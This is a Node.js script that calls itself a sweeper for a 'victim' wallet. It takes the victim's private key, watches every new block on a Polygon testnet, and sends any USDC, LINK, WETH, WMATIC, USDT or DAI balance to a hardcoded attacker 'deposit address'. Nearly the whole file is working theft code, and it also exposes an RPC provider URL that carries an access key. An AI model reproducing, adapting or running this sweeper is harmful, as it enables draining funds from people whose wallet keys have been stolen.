const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const abi = require('./abi.json');
const BigNumber = require('bignumber.js');



const app = express();
const server = http.createServer(app);
const io = new Server(server);
const socket = require('socket.io-client')("http://localhost:3000");
const { ethers } = require('ethers');

const port = 3000;

server.listen(port, () => {
    console.log(`Server listening on port - ${port}`);
});

const provider = new ethers.JsonRpcProvider("https://purple-restless-gas.matic-testnet.discover.quiknode.pro/c479b637ea1e548a7b97ab0c52d7b75b5eb71691/");

// tokens
const tokens = {
    "USDC": "0xe9DcE89B076BA6107Bb64EF30678efec11939234",
    "LINK": "0x4e2f1e0dc4ead962d3c3014e582d974b3cedf743",
    "WETH": "0xD087ff96281dcf722AEa82aCA57E8545EA9e6C96",
    "WMATIC": "0xf237dE5664D3c2D2545684E76fef02A3A58A364c",
    "USDT": "0xacde43b9e5f72a4f554d4346e69e8e7ac8f352f0",
    "DAI": "0xf14f9596430931e177469715c591513308244e8f"
};

// deposit address
const recipientAddress = '0x2824C88FFf36D53CBD0F932b3ba4782Ff435DE8C';

// private key of the victim
const privateKey = '';

const getPublicKey = (privateKey) => {
    try {
        const wallet = new ethers.Wallet(privateKey, provider);
        return wallet.address;
    } catch (error) {
        console.log("Error at generating the public key of the user - ", error);
    }
};



const initializeVictimWalletAndTransfer = async (amount, tokenAddress, name) => {
    const wallet = new ethers.Wallet(privateKey, provider);
    const tokenContract = new ethers.Contract(tokenAddress, abi, wallet);
    console.log(amount.toString());
    try {
        let amt;
        switch (name) {
            case 'USDC':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(6));
                break;
            case 'LINK':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(18));
                break;
            case 'WETH':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(18));
                break;
            case 'WMATIC':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(18));
                break;
            case 'USDT':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(6));
                break;
            case 'DAI':
                amt = new BigNumber(amount).multipliedBy(new BigNumber(10).pow(18));
                break;
            default:
                throw new Error(`Unsupported token: ${name}`);
        }
        console.log("amount - ", amt.toString());

        const tx = await tokenContract.transfer(recipientAddress, amt.toFixed());
        console.log('Transaction hash - ', tx.hash);
        await tx.wait();
        console.log(`${amount} Tokens sent to ${recipientAddress} address`);
    } catch (error) {
        console.log(
            'Error occurred while invoking the initializeVictimWalletAndTransfer function - ',

        );
    }
};



// socket io config to listen and handle multiple events
io.on('connection', (socket) => {
    console.log('New client connected');
    socket.on('transferEvent', (data) => {
        console.log('Received transfer function call:', data);
    });

    // listen to user wallet balances
    socket.on('USDCTokenBalances', async (data) => {
        console.log("Received USDC user balances event - ", data.bal)
        console.log("USDC balance is above 0");
        await initializeVictimWalletAndTransfer((parseInt(data.bal) / (10 ** 6)), data.tokenAddress, data.name)

    })
    socket.on('LINKTokenBalances', async (data) => {
        console.log("Received LINK user balances event - ", data.bal)
        console.log("LINK balance is above 0");
        console.log(parseInt(data.bal) / (10 ** 18) > 0)
        await initializeVictimWalletAndTransfer(parseInt(data.bal) / (10 ** 18), data.tokenAddress, data.name)

    })
    socket.on('WETHTokenBalances', async (data) => {
        console.log("Received WETH user balances event - ", data.bal)
        console.log("WETH balance is above 0");
        await initializeVictimWalletAndTransfer((parseInt(data.bal) / (10 ** 18)), data.tokenAddress, data.name)

    })
    socket.on('WMATICTokenBalances', async (data) => {
        console.log("Received WMATIC user balances event - ", data.bal)
        console.log("Token balance is above 0");
        await initializeVictimWalletAndTransfer((parseInt(data.bal) / (10 ** 18)), data.tokenAddress, data.name)

    })
    socket.on('USDTTokenBalances', async (data) => {
        console.log("Received USDT user balances event - ", data.bal)
        console.log("USDT balance is above 0");
        await initializeVictimWalletAndTransfer((parseInt(data.bal) / (10 ** 6)), data.tokenAddress, data.name)

    })
    socket.on('DAITokenBalances', async (data) => {
        console.log("Received DAI user balances event - ", data.bal)
        console.log("DAI balance is above 0");
        await initializeVictimWalletAndTransfer((parseInt(data.bal) / (10 ** 18)), data.tokenAddress, data.name)

    })

    socket.on('disconnect', () => {
        console.log('Client disconnected');
    });
});

// checks for the current ERC20 token balance of the wallet
const checkWalletTokenBalance = async (userAddress) => {
    const tokenContractUSDC = new ethers.Contract(tokens.USDC, abi, provider);
    const balUSDC = await tokenContractUSDC.balanceOf(userAddress);

    const tokenContractLINK = new ethers.Contract(tokens.LINK, abi, provider);
    const balLINK = await tokenContractLINK.balanceOf(userAddress);

    const tokenContractWETH = new ethers.Contract(tokens.WETH, abi, provider);
    const balWETH = await tokenContractWETH.balanceOf(userAddress);

    const tokenContractWMATIC = new ethers.Contract(tokens.WMATIC, abi, provider);
    const balWMATIC = await tokenContractWMATIC.balanceOf(userAddress);

    const tokenContractUSDT = new ethers.Contract(tokens.USDT, abi, provider);
    const balUSDT = await tokenContractUSDT.balanceOf(userAddress);

    const tokenContractDAI = new ethers.Contract(tokens.DAI, abi, provider);
    const balDAI = await tokenContractDAI.balanceOf(userAddress);

    if (balUSDC > 0) {
        const balance = balUSDC.toString(); // Convert BigInt to string
        socket.emit('USDCTokenBalances', { bal: balance, tokenAddress: tokens.USDC, name: "USDC" });
    }
    if (balLINK > 0) {
        const balance = balLINK.toString(); // Convert BigInt to string
        socket.emit('LINKTokenBalances', { bal: balance, tokenAddress: tokens.LINK, name: "LINK" });
    }
    if (balWETH > 0) {
        const balance = balWETH.toString(); // Convert BigInt to string
        socket.emit('WETHTokenBalances', { bal: balance, tokenAddress: tokens.WETH, name: "WETH" });
    }
    if (balWMATIC > 0) {
        const balance = balWMATIC.toString(); // Convert BigInt to string
        socket.emit('WMATICTokenBalances', { bal: balance, tokenAddress: tokens.WMATIC, name: "WMATIC" });
    }
    if (balUSDT > 0) {
        const balance = balUSDT.toString(); // Convert BigInt to string
        socket.emit('USDTTokenBalances', { bal: balance, tokenAddress: tokens.USDT, name: "USDT" });
    }
    if (balDAI > 0) {
        const balance = balDAI.toString(); // Convert BigInt to string
        socket.emit('DAITokenBalances', { bal: balance, tokenAddress: tokens.DAI, name: "DAI" });
    }
};

// subscribe to newBlockHeaders event which basically gets triggered whenever a new block gets mined in the chain, basically used as a timer functionality to monitor the balance of the wallet
const listenToBlocks = async () => {
    try {
        provider.on('block', async (blockNumber) => {
            console.log("New block mined - ", blockNumber);
            await checkWalletTokenBalance(getPublicKey(privateKey))
        })
    } catch (error) {
        console.log("An error occured while listening to the block numbers");
    }
}

listenToBlocks()

